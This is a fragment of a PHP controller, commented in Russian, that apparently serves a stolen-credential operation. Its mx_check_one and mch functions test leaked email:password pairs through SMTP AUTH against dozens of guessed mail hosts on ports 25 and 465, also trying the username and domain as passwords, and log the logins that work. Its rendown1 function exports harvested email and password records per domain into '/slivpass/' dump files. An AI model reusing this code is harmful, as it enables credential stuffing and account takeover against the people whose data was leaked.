		$loginpass = str_replace('
		', '', $loginpass);

		$explp = explode(":", $loginpass);

		return $explp;
	}
	
	function show_f($filep,$f_number){//доп функция

		if($this->debug)
		{
			$this->writelogs('show_f $filep='.$filep,"DEBUG.txt");
		}
		
		$phdbdir = opendir ($filep);
		
		while ( $file = readdir ($phdbdir))
		{
			if (( $file != ".") && ($file != "..") && ($file != "Thumbs.db")) 
			{
				$chekpfilecount = $chekpfilecount + 1;
				
				if ($f_number == $chekpfilecount)
				{
					$photofile = $file;
				}
			}
		}
		closedir ($phdbdir);	

		$postfile=$filep.$photofile;

		return $postfile;
	}
	
	function count_f($filedir){

		if($this->debug)
		{
			$this->writelogs('count_f(in) $filedir='.$filedir,"DEBUG.txt");
		}


		$phdbdir = opendir ($filedir);
		
		$pfilecount = 0;
		
		while ( $file = readdir ($phdbdir))
		{
			if (( $file != ".") && ($file != "..")&& ($file != "Thumbs.db")) 
			{
				$pfilecount = $pfilecount + 1;
			}
		}
		closedir ($phdbdir);


		return $pfilecount;
	}

	function mx_check_one($ku){
		
		
		$ku=base64_decode($ku);
		$ku = urldecode($ku);
		$this->d($ku,'ku');
		
		if($this->debug)
		{
			$this->writelogs('mx_check_one  milopas='.$ku,"DEBUG.txt");
		}
		
		
		
		$tout = 3;
		
		$corp_pass = true;
		
		$passs = array();
		
		$tmp = explode(':',$ku);
		
		$fm = $tmp[0];
		$pass = $tmp[1];
		
		$mh = explode("@", $fm);
		$em = $mh[0];
		$host = $mh[1];
		$ping = fsockopen($host,80,$errno,$errstr,$tout);

		$passs[]=$pass;
		$passs[] = $em;
		$passs[] = str_replace('http://','',$host);
		
		if(!$ping)
		{
			$this->mx_check_result($fm,$b = false);
		}

		fclose($ping);
		
		
		
		$smtp=$this->smtp_lookup($host);
		
		foreach($passs as $pass2)
		{
			$lport=25;
			$try=$this->mch($smtp,$lport,$em,$pass2,$fm);
		}
		
		

		if($try=='BHOST')
		{
			$smtp='ssl://'.$smtp;
			$lport=465;
			$try=$this->mch($smtp,$lport,$em,$pass,$fm);
		}
		
		if($try=='BAUTH')
		{
			$try=$this->mch($smtp,$lport,$fm,$pass,$fm);
		}
		
		$this->mch('smtp.'.$host,25,$em,$pass,$fm);
		$this->mch('smtp.'.$host,25,$fm,$pass,$fm);
		$this->mch('mail.'.$host,25,$em,$pass,$fm);
		$this->mch('mail.'.$host,25,$fm,$pass,$fm);
		$this->mch('mx.'.$host,25,$em,$pass,$fm);
		$this->mch('mx.'.$host,25,$fm,$pass,$fm);
		$this->mch($host,25,$em,$pass,$fm);
		$this->mch('relay.'.$host,25,$em,$pass,$fm);
		$this->mch('email.'.$host,25,$em,$pass,$fm);
		$this->mch('pop.'.$host,25,$em,$pass,$fm);
		$this->mch('pop3.'.$host,25,$em,$pass,$fm);
		$this->mch('imap.'.$host,25,$em,$pass,$fm);
		$this->mch('freemail.'.$host,25,$em,$pass,$fm);
		$this->mch('box.'.$host,25,$em,$pass,$fm);
		$this->mch('smtp.mail.'.$host,25,$em,$pass,$fm);
		$this->mch($host,25,$fm,$pass,$fm);
		$this->mch('relay.'.$host,25,$fm,$pass,$fm);
		$this->mch('email.'.$host,25,$fm,$pass,$fm);
		$this->mch('pop.'.$host,25,$fm,$pass,$fm);
		$this->mch('pop3.'.$host,25,$fm,$pass,$fm);
		$this->mch('imap.'.$host,25,$fm,$pass,$fm);
		$this->mch('freemail.'.$host,25,$fm,$pass,$fm);
		$this->mch('box.'.$host,25,$fm,$pass,$fm);
		$this->mch('smtp.mail.'.$host,25,$fm,$pass,$fm);
		$this->mch('ssl://smtp.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://mail.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://smtp.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://mail.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://mx.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://mx.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://relay.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://email.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://pop.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://pop3.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://imap.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://freemail.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://box.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://smtp.mail.'.$host,465,$em,$pass,$fm);
		$this->mch('ssl://'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://relay.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://email.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://pop.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://pop3.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://imap.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://freemail.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://box.'.$host,465,$fm,$pass,$fm);
		$this->mch('ssl://smtp.mail.'.$host,465,$fm,$pass,$fm);
		
	}
	
	function mx_check_result($fm,$mx){
		$fm = trim($fm);
		if($mx == false)die();
		
		//if($mx !==false AND $mx !='')
		//{
		$write_file = fopen ('smtp.txt',"a+");
		fputs ( $write_file, "\n".$mx);
		fclose ($write_file);
		
		$this->Post->query("UPDATE  `mails` SET  `mx` ='".$mx."' WHERE  `email` ='".$fm."'");
		///}
		die();
	}
	
	function smtp_lookup($host){

		if(function_exists("getmxrr"))
		{
			getmxrr($host,$mxhosts,$mxweight);
			return $mxhosts[0];
		}
		
		return 'mail';
	}
	
	function mch($host,$port,$mail,$pass,$fm){//auth + send stats

		//global $tout,$rel,$ehlo,$sds;
		
		$ehlo = $host;
		$tout = 10;
		
		$smtp_conn = fsockopen($host,$port,$errno,$errstr,$tout);
		
		if(!$smtp_conn) 
		{
			fclose($smtp_conn);
			return ("BHOST");
		}

		$data = $this->get_data($smtp_conn);
		fputs($smtp_conn,"EHLO ".$ehlo."\r\n");
		$code = substr($this->get_data($smtp_conn),0,3);

		if($code != 250) 
		{
			fclose($smtp_conn);
			return("BAUTH");
		}

		fputs($smtp_conn,"AUTH LOGIN\r\n");
		$code = substr($this->get_data($smtp_conn),0,3);

		if($code != 334) 
		{
			fclose($smtp_conn); 
			return ("BAUTH");
		}

		fputs($smtp_conn,base64_encode($mail)."\r\n");
		$code = substr($this->get_data($smtp_conn),0,3);

		if($code != 334) 
		{
			fclose($smtp_conn); 
			return ("BAUTH");
		}

		fputs($smtp_conn,base64_encode($pass)."\r\n");
		$code = substr($this->get_data($smtp_conn),0,3);

		if($code != 235)
		{
			fclose($smtp_conn);
			return ("BAUTH");
		}
		
		fclose($smtp_conn);
		
		$this->mx_check_result($fm,$host.','.$port.','.$mail.','.$pass);
		die();

		//post_mch($sds,'OK',$rel.';||'.$host.'||'.$port.'||'.$mail.'||'.$pass);
	}

	function get_data($fp){

		$data="";
		
		while($str=fgets($fp,515))
		{
			$data.=$str;
			if(substr($str,3,1)==" ")
			{
				break;
			}
		}
		
		return $data;
	}

	function writelogs($logfstr,$where = "log.txt"){

		date_default_timezone_set("Europe/Kiev");
		$logfstr='<br>
		<span style="background: //cacbcc;">['.date("H:i:s").']</span>'.$logfstr;

		echo $logfstr;
		$logfile = fopen ($where,"a+");
		fputs ( $logfile, $logfstr);
		fclose ($logfile);
	}
	
	
	
	
	
	//////////////ДОКАЧКА и формирование таблицы/////////////////
	
	function rendown1(){//функция для фоного скачивания баз и записи в отдельную таблицу и в файл ОСНОВНАЯ
		
		//echo '<pre>';
		//print_r($this->params);
		//echo '</pre>';
		$this->timeStart = $this->start('rendown1',1);	
		//exit;
		
		$this->s();//замер времени
		
		//////////УДАЛИМ МАЛЫЕ ВЫБОРКИ//////////
		
		
		
		$str1 = '';
		$str11 = '';
		$str12 = '';
		
		
		
		//епать хитрая хуйня получилась, она нужна для того чтобы отсеять во время скачки в файл те домены, которые в данный момент дампяться в fileds get = 1
		
		
		//////НАХОДИМ КАКИЕ НЕ НАДО ПОКА ЧТО СКАЧИВАТЬ В ФАЙЛ НИЖЕ//////////////////////
		$data10tmp = $this->Filed->query("select `post_id` FROM `fileds` WHERE `get` ='1'  AND `password` !=':' GROUP BY `post_id`");
		
		//логирование
		$this->d("select post_id FROM `fileds` WHERE `get`='1'  AND `password` !=':' GROUP BY post_id");
		$this->d($data10tmp);
		
		$i10 = 0;
		//перебираем все наши такие post_id и определяем какой домен у post_id
		foreach ($data10tmp as $tmp10)
		{
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .=" `post_id` !='{$k}' AND";
			//по post_id вытаскиывает url и по нему уже host определяем
			$data11tmp = $this->Filed->query("select url FROM `posts` WHERE `id`={$k}");
			//$this->d($data11tmp);
			
			$data11tmp[0]['posts']['url'] = str_replace('http://','',$data11tmp[0]['posts']['url']);
			$data11tmp[0]['posts']['url'] = 'http://'.$data11tmp[0]['posts']['url'];
			
			$url = parse_url($data11tmp[0]['posts']['url']);
			$str12 .=" domen !='".$url['host']."' AND";
			$i10++;
		}
		
		if($i10 !=1)$str11 =substr($str11, 0, strlen($str11)-3);//если несколько убираем AND в конце
		$str12 =substr($str12, 0, strlen($str12)-3);//убираем AND в конце
		
		//лог
		$this->d($str11,'11');
		$this->d($str12,'12');
		//////////////////////////////////////////////////////////////////////////////////	
		
		////////////////сначала выбираем те базы которые со статусом = 3//////////////////
		$data0tmp = $this->Filed->query("select * FROM `renders`  WHERE {$str11} (`statusNoHash` = 3 OR `statusHash` = 3 OR `statusMail` = 3) limit 1");
		
		//лог
		$this->d("select * FROM `renders` WHERE {$str11} (`statusNoHash` = 3 OR `statusHash` = 3 OR `statusMail` = 3) limit 1");
		$this->d($data0tmp,'data0tmp - STATUS 3');
		///////////////////
		

		//если есть не докачанные базы
		if($data0tmp[0]['renders']['id'] != 0)
		{
			
			echo '!!!!!!!!est status 3!!!!!!!!<br>';
			
			
			//////ФОРМИРУЕМ КАКИЕ ВЫБИРАТЬСЯ НЕ ДОЛЖНЫ, ПОТОМУ ЧТО ОНИ УЖЕ ЕСТЬ В RENDERS/////////////
			foreach ($data0tmp as $tmp0)
			{
				$k = trim($tmp0['renders']['domen']);
				$str1 .=" `domen` ='{$k}' AND";		
			}
			
			
			$str1 =substr($str1, 0, strlen($str1)-3);
			
			if(strlen($str1) > 3){
				$str1 = 'WHERE '.$str1;
			}else{
				$str1 = '';
			}
			$dok = true;
			
			
		}else
		{//качаем базы с нуля
			echo '!!!!!!!!!rabotaem po status 2!!!!!!!!!!!!<br>';
			
			$dok = false;
			//начинаем скачивать в файл новые базы, даже при get == 1
			$data0tmp = $this->Filed->query("select * FROM `renders` WHERE `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2");
			
			//$this->d($data0tmp,'data0tmp - STATUS 2');
			
			$str1 = '';
			
			//////ФОРМИРУЕМ КАКИЕ ВЫБИРАТЬСЯ НЕ ДОЛЖНЫ, ПОТОМУ ЧТО ОНИ УЖЕ ЕСТЬ В RENDERS/////////////
			foreach ($data0tmp as $tmp0)
			{
				$k = trim($tmp0['renders']['domen']);
				$str1 .=" `domen` !='{$k}' AND";		
			}
			
			$str1 =substr($str1, 0, strlen($str1)-3);
			
			if(strlen($str1) > 4)
			{
				$str1 = 'WHERE '.$str1;
			}else{
				$str1 = '';
			}
			
		}

		
		///////Выборка из таблицы с мылами на нашими условиями/////////////
		if($str12 !='')
		{
			$str1 = $str1.' AND ';
			$str2 = "SELECT `domen`  FROM  `mails` {$str1} {$str12} GROUP BY `domen` order by count(domen) DESC limit 0,1";
		}else
		{
			$str2 = "SELECT `domen`  FROM  `mails` {$str1} GROUP BY `domen` order by count(domen) DESC limit 0,1";
		}
		
		$data1tmp = $this->Filed->query($str2);
		
		///////Logs////////////
		$this->d($str1,'str1');
		$this->d($str2,'str2');
		$this->d($data1tmp,'$data1tmp');
		$this->p('pred_viborka');
		flush();
		
		////////////////////////////////////////////////
		$p  = array();		
		
		foreach ($data1tmp as $d)
		{

			
			$z = $d['mails']['domen'];
			$domen = $z;

			//////ВЫБОРКИ НУЖНЫЕ//////////////
			$p[$z]['randPass'] = $this->Filed->query("SELECT `pass` FROM  `mails` WHERE `domen` = '{$z}' AND `pass` !='0' limit 0,3");
			//order by rand() отнимало 21 секунд при 14кк записях у одного домена		
			
			
			$p[$z]['country'] = $this->Filed->query("SELECT `country` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
			
			$p[$z]['category'] = $this->Filed->query("SELECT `category` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
			
			$p[$z]['post_id'] = $this->Filed->query("SELECT `post_id` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen` = '$domen' limit 0,1) limit 0,1");
			
			$p[$z]['date'] = $this->Filed->query("SELECT `date` FROM  `mails` WHERE `domen` = '{$z}' group by `date` limit 0,1");
			
			

			$p[$z]['post_id'] =  $p[$z]['post_id'][0]['fileds']['post_id'];
			$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
			$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
			$p[$z]['date'] = $p[$z]['date'][0]['mails']['date'];
			
			if($p[$z]['category'] == '')$p[$z]['category'] = '0';
			if($p[$z]['country'] == '')$p[$z]['country'] = '0';
			if($p[$z]['post_id'] == '')$p[$z]['post_id'] = '0';
			$p[$z]['category'] = str_replace('/','-',$p[$z]['category']);
			/////////////////////////////////////////
			

			
			////////в кучу пассы собираем////////////
			$strPassTmp = '';
			
			foreach($p[$z]['randPass'] as $passTmp0)
			{	
				$strPassTmp .=$passTmp0['mails']['pass']."<br>";
			}
			$p[$z]['randPass'] = $strPassTmp;
			/////////////////////////////////////
			

			
			
			///// расчитываем количество мыл, если дохуя записей в базе данных/////
			$countAll = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `domen` = '{$z}' ");
			$countAll = $countAll[0][0]['count(*)'];
			$this->d($countAll,'$countAll');
			/////////////////////////////////////
			
			
			if($countAll < $this->delete AND $countAll !=0)
			{
				//$this->Filed->query("DELETE FROM `mails` WHERE `domen` = '$z'");
				$this->d($z,'DELETE iz vtoroy proverki');
				$this->logs('DELETE '.$z.' udalen iz mails < '.$this->delete,__FUNCTION__);
			}
			
			////БЛОК ПОДСЧЁТА ХЭШЕЙ//////////
			$counthash  = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE `domen` = '$domen' AND `hashtype` !='0' AND `pass` !='0'");
			$countNoHash = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE `domen` = '$domen' AND `hashtype` ='0' AND `pass` !='0'");
			
			$p[$z]['countHash'] = $counthash[0][0]['count(pass)'];
			$this->d($p[$z]['countHash'],'countHash!!!!!');
			$p[$z]['countNoHash'] = $countNoHash[0][0]['count(pass)'];
			$this->d($p[$z]['countNoHash'],'countNoHash!!!!!');
			////////////////////////////////////////////
			
			//////// БЛОК с пассами КОЛИЧЕСТВО///////////
			$count  = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `domen` = '$domen' AND `pass` !='0'");
			$p[$z]['countPass'] = $count[0][0]['count(*)'];
			$this->d($p[$z]['countPass'],'countPass!!!!!');
			///////////////////////////////////////////////
			
			
			
			//////// БЛОК ПРОСТО EMAILS КОЛИЧЕСТВО///////////
			$count2 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `domen` = '$domen'");
			$p[$z]['countMail'] = $count2[0][0]['count(*)'];
			$this->d($p[$z]['countMail'],'countMail!!!!!');
			/////////////////////////////////////////////////
			
			
			//////// БЛОК ОСТАТКА БЕЗ ПАССОВ///////////
			$count3 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE `domen` = '$domen' AND `pass` ='0'");
			$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
			$this->d($p[$z]['countMailnoPass'],'countMailnoPass!!!!!');
			/////////////////////////////////////////////////
			$data0tmp = $this->Filed->query("SELECT * FROM  `renders` WHERE `domen` = '$domen'");
			//////////////////////////
			
			
			$lastCountHash = $data0tmp[0]['renders']['lastCountHash'];
			$lastCountNoHash = $data0tmp[0]['renders']['lastCountNoHash'];
			$lastCountMail = $data0tmp[0]['renders']['lastCountMail'];
			$statusNoHash = $data0tmp[0]['renders']['statusNoHash'];
			$statusHash = $data0tmp[0]['renders']['statusHash'];
			$statusMail = $data0tmp[0]['renders']['statusMail'];
			
			
			
			//////////////////////////
			if(!isset($lastCountHash))$lastCountHash=0;
			if(!isset($lastCountNoHash))$lastCountNoHash=0;
			if(!isset($lastCountMail))$lastCountMail=0;
			
			if(!isset($statusNoHash))$statusNoHash=2;
			if(!isset($statusHash))$statusHash=2;
			if(!isset($statusMail))$statusMail=2;
			//////////////////////////
			
			
			/////////////LOG//////////////////
			$this->d($lastCountHash,'$lastCountHash');
			$this->d($lastCountNoHash,'$lastCountNoHash');
			$this->d($lastCountMail,'$lastCountMail');
			
			$this->d($statusNoHash,'$statusNoHash');
			$this->d($statusHash,'$statusHash');
			$this->d($statusMail,'$statusMail');
			//////////////////////////////////
			flush();

			///Делаем название у файла/////////
			$all ='';
			$all .= $domen;
			
			
			
			
			$all = "/slivpass/".$all.'.txt';
			$this->d($all,'all');
			
			
			/////////////////////////////////////
			$this->p('Do osnovnyh viborok');
			flush();
			
			///если записей мало, то просто в файл сохранаяем///////
			if($countAll < $this->lim2)
			{
				echo 'countAll <'.$this->lim2.'<br>';
				//////// БЛОК с пассами без хешей///////////
				
				$data0 = $this->Filed->query("SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = '$z' AND `pass` !='0' AND `hashtype` ='0'" );

				$z0 = '';
				
				foreach($data0 as $d)
				{
					$z0 .= $d['mails']['email'];
					$z0 .= ":";
					$z0 .= $d['mails']['pass'];
					$z0 .= "\r\n";

				}
				//////////////////////////////////		
				$stop = $this->get_time();
				echo $stop - $start;
				//запись в файл
				
				//////// БЛОК с пассами///////////
				
				$data1 = $this->Filed->query("SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = '$z' AND `pass` !='0' AND `hashtype` !='0' ");

				$z1 = '';
				
				foreach($data1 as $d)
				{
					$z1 .= $d['mails']['email'];
					$z1 .= ":";
					$z1 .= $d['mails']['pass'];
					$z1 .= "\r\n";

				}
				
				///////////////////////////////////
				$stop1 = $this->get_time();
				echo $stop2 - $start1;
				

				////////БЛОК без пассов///////////
				
				
				$data2 = $this->Filed->query("SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = '$z' AND `pass` ='0'");
				$stop =  $this->get_time();
				
				$z2 = '';
				
				foreach($data2 as $d2)
				{
					$z2 .= $d2['mails']['email'];
					$z2 .= "\r\n";
					
				}
				$stop2 = $this->get_time();
				echo $stop2 - $start;
				
				
				
			}else//если больше чем lim тогда будем бить файл
			{
				
				$limitYes = true;
				
				echo 'countAll >'.$this->lim2.'<br>';
				
				//у нас данные сохраняются по порядку без паролей, хэши и просто мыла

				
				//////// БЛОК с пассами без хешей///////////
				if($dok == FALSE AND $lastCountNoHash == 0)//если домен нужно с нуля закачать в файл
				{
					
					
					echo 'dok == FALSE AND lastCountNoHash<br>';
					
					//расчёт сколько дампить надо по записям без пассов
					if($p[$z]['countNoHash'] > $this->lim){
						
						$limitNoHash = $this->lim;
						$statusNoHash = 3;
					}else{
						
						$limitNoHash = $p[$z]['countNoHash'];
						$statusNoHash = 2;
					}
					

					$data0 = $this->Filed->query("SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = '$z' AND `pass` !='0' AND `hashtype` ='0' limit 0,{$limitNoHash}" );
					
					$this->d("SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = '$z' AND `pass` !='0' AND `hashtype` ='0' limit 0,{$limitNoHash}");
					
					$z0 = '';
					
					foreach($data0 as $d)
					{
						$z0 .= $d['mails']['email'];
						$z0 .= ":";
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

					}

					//////////////////////////////////
					
					//если домен требует докачки в файл
				}else
				{
					
					if($statusNoHash == 3)
					{
						$ht = "`pass` !='0' AND `hashtype` ='0'"; 
						echo 'Dokachka lastCountNoHash<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countNoHash']-$lastCountNoHash) > $this->lim){
							
							$limitNoHash = $this->lim;
							$statusNoHash = 3;
						}else{
							
							$limitNoHash = $p[$z]['countNoHash']-$lastCountNoHash;
							$statusNoHash = 2;
						}
						
						
						$data0 = $this->Filed->query("SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountNoHash},{$limitNoHash}" );
						
						$this->d("SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountNoHash},{$limitNoHash}",'');
						
						$z0 = '';
						
						foreach($data0 as $d)
						{
							$z0 .= $d['mails']['email'];
							$z0 .= ":";
							$z0 .= $d['mails']['pass'];
							$z0 .= "\r\n";

						}
						$next = $lastCountNoHash+$limitNoHash;

						$this->Post->query("UPDATE `renders` SET 
						`statusNoHash`={$statusNoHash},
						`lastCountNoHash`=$next
						WHERE `domen` = '{$domen}'");
						
					}
					
				}
				//////////////////////////////////
				$this->p('NoHash_time');
				$this->d('1');		
				$this->d($limitNoHash,'limitNoHash');
				$this->d($statusNoHash,'statusNoHash');
				$this->d($lastCountNoHash,'lastCountNoHash');
				flush();
				
				
				//////// БЛОК с пассами c ХЭШАМИ///////////
				if($dok == FALSE AND $lastCountHash == 0)//если домен нужно с нуля закачать в файл
				{
					echo 'dok == FALSE AND lastCountHash<br>';
					
					//расчёт сколько дампить надо по записям без пассов
					if($p[$z]['countHash'] > $this->lim){
						
						$limitHash = $this->lim;
						$statusHash = 3;
					}else{
						
						$limitHash = $p[$z]['countHash'];
						$statusHash = 2;
					}
					
					

					$data1 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND `pass` !='0' AND hashtype !='0' limit 0,{$limitHash}" );
					
					$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND `pass` !='0' AND `hashtype` !='0' limit 0,{$limitHash}");
					
					$z1 = '';
					
					foreach($data1 as $d)
					{
						$z1 .= $d['mails']['email'];
						$z1 .= ":";
						$z1 .= $d['mails']['pass'];
						$z1 .= "\r\n";

					}
					//////////////////////////////////
					
					//если домен требует докачки в файл
				}else
				{
					if($statusHash == 3)
					{
						$ht = "pass !='0' AND hashtype !='0'"; 
						
						echo 'Dokachka lastCountHash<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countHash']-$lastCountHash) > $this->lim){
							
							$limitHash = $this->lim;
							$statusHash = 3;
						}else{
							
							$limitHash = $p[$z]['countHash']-$lastCountHash;
							$statusHash = 2;
						}
						
						
						$data1 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountHash},{$limitHash}" );
						
						$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountHash},{$limitHash}");
						
						$z1 = '';
						
						foreach($data1 as $d)
						{
							$z1 .= $d['mails']['email'];
							$z1 .= ":";
							$z1 .= $d['mails']['pass'];
							$z1 .= "\r\n";

						}

						$next = $lastCountHash+$limitHash;
						
						$this->Post->query("UPDATE `renders` SET 
						`statusHash`={$statusHash},
						`lastCountHash`=$next
						WHERE `domen` = '{$domen}'");

					}
				}
				//////////////////////////////////	
				$this->p('Hash_time');
				$this->d('2');		
				$this->d($limitHash,'limitHash');
				$this->d($statusHash,'statusHash');
				$this->d($lastCountHash,'lastCountHash');
				flush();
				//exit;
				
				////////БЛОК без пассов///////////

				if($dok == FALSE AND $lastCountMail == 0)//если домен нужно с нуля закачать в файл
				{
					echo 'dok == FALSE AND lastCountMail<br>';
					
					//расчёт сколько дампить надо по записям без пассов
					if($p[$z]['countMailnoPass'] > $this->lim){
						
						$limitMail = $this->lim;
						$statusMail = 3;
					}else{
						
						$limitMail = $p[$z]['countMailnoPass'];
						$statusMail = 2;
					}
					
					

					$data2 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND `pass` ='0' limit 0,{$limitMail}" );
					
					$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND `pass` ='0' limit 0,{$limitMail}");
					
					$z2 = '';
					
					foreach($data2 as $d)
					{
						$z2 .= $d['mails']['email'];
						$z2 .= "\r\n";

					}
					//////////////////////////////////
					
					//если домен требует докачки в файл
				}else
				{
					if($statusMail == 3)
					{
						$ht = "pass ='0'"; 
						echo 'Dokachka lastCountMail<br>';
						//расчёт сколько дампить надо по записям без пассов
						if(($p[$z]['countMailnoPass']-$lastCountMail) > $this->lim){
							
							$limitMail = $this->lim;
							$statusMail = 3;
						}else{
							$limitMail = $p[$z]['countMailnoPass']-$lastCountMail;
							$statusMail = 2;
						}
						
						
						$data2 = $this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountMail},{$limitMail}" );
						
						$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = '$z' AND {$ht} limit {$lastCountMail},{$limitMail}");
						
						$z2 = '';
						
						foreach($data2 as $d)
						{
							$z2 .= $d['mails']['email'];
							$z2 .= "\r\n";
						}

						$next = $lastCountMail+$limitMail;
						
						$this->Post->query("UPDATE `renders` SET 
						`statusMail`={$statusMail},
						`lastCountMail`=$next
						WHERE `domen` = '{$domen}'");
						
					}

				}
				$this->p('Mail_time');
				$this->d('3');		
				$this->d($limitMail,'limitMail');
				$this->d($statusMail,'statusMail');
				$this->d($lastCountMail,'lastCountMail');
				flush();
				
			}
			//склеиваем все полученные данные
			$str = $z0.$z1.$z2;
			
			//////запись в файл/////////////
			$fh = fopen('.'.$all, "a+");//всегда создаётся с нуля, если есть то дописываем
			fwrite($fh, $str);
			fclose($fh);
			flush();
			
			//проверка не записан ли уже домен в базу
			$fieldcount = $this->Post->query("SELECT * FROM  `renders` WHERE  `domen` ='{$domen}'");
			
			if(count($fieldcount)>0)continue;
			
			
			if($limitYes == TRUE){
				
				$this->d('limitYes zapis v bazu');
				
				$this->Post->query("INSERT INTO renders (
			`post_id`,
			`domen`,
			`countMail`,
			`countPass`,
			`countHash`,
			`countNoHash`,
			`download`,
			
			`statusNoHash`,
			`statusHash`,
			`statusMail`,
			
			
			`lastCountNoHash`,
			`lastCountHash`,
			`lastCountMail`,
			
			`date`,
			`randPass`,
			`category`,
			`country`) 
			
			VALUES(
			'{$p[$z][post_id]}',
			'{$domen}',
			{$p[$z][countMail]},
			{$p[$z][countPass]},
			{$p[$z][countHash]},
			{$p[$z][countNoHash]},
			'{$all}',
			
			{$statusNoHash},
			{$statusHash},
			{$statusMail},
			
			{$limitNoHash},
			{$limitHash},
			{$limitMail},
			
			'{$p[$z][date]}',
			'{$p[$z][randPass]}',
			'{$p[$z][category]}',
			'{$p[$z][country]}')");
				
			}else{
				
				$this->d('limit < 500000 zapis v bazu');
				
				$this->Post->query("INSERT INTO renders (
			`post_id`,
			`domen`,
			`countMail`,
			`countPass`,
			`countHash`,
			`countNoHash`,
			`download`,
			
			`statusNoHash`,
			`statusHash`,
			`statusMail`,
			
			
			`lastCountNoHash`,
			`lastCountHash`,
			`lastCountMail`,
			
			`date`,
			`randPass`,
			`category`,
			`country`) 
			
			VALUES(
			'{$p[$z][post_id]}',
			'{$domen}',
			{$p[$z][countMail]},
			{$p[$z][countPass]},
			{$p[$z][countHash]},
			{$p[$z][countNoHash]},
			'{$all}',
			
			2,
			2,
			2,
			
			0,
			0,
			0,
			
			'{$p[$z][date]}',
			'{$p[$z][randPass]}',
			'{$p[$z][category]}',
			'{$p[$z][country]}')");
				
				
			}

		}
		$this->p('END_TIME');
		$this->stop();
		
		die;
		
	}
	
	function rendown2(){//функция для докачивания локальных файлов, в фоне
		//echo '<pre>';
		//print_r($this->params);
		//echo '</pre>';
		
		$this->timeStart = $this->start('rendown2',1);		
		$start = $this->get_time();
		$str1 = '';
		$str11 = '';
		
		
		//докачивать будем те базы которые в данный момент дампятся тоесть status get 1
		
		$data10tmp = $this->Filed->query("select `post_id` FROM `fileds` WHERE get='1' GROUP BY `post_id`");
		
		//логирование
		$this->d("select `post_id` FROM `fileds` WHERE get='1' GROUP BY `post_id`");
		$this->d($data10tmp);
		
		$i10 = 0;
		//перебираем все наши такие post_id
		foreach ($data10tmp as $tmp10)
		{
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .=" `post_id` ={$k} or";
			$i10++;
		}
		
		$str11 =substr($str11, 0, strlen($str11)-3);//если несколько убираем AND в конце
		//$str12 =substr($str12, 0, strlen($str12)-3);//убираем AND в конце
		
		//лог
		$this->d($str11,'$str11');
		
		if($str11 !=''){
			$str11 = ' AND ('.$str11.')';
			
		}
		
		$data0tmp = $this->Filed->query("select * FROM `renders` WHERE  `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2 {$str11}");
		
		//лог	
		$this->d("select * FROM `renders` WHERE  statusNoHash = 2 AND `statusHash` = 2 AND `statusMail` = 2 {$str11}");
		$this->d($data0tmp,'$data0tmp');	
		
		if(count($data0tmp ) == 0)
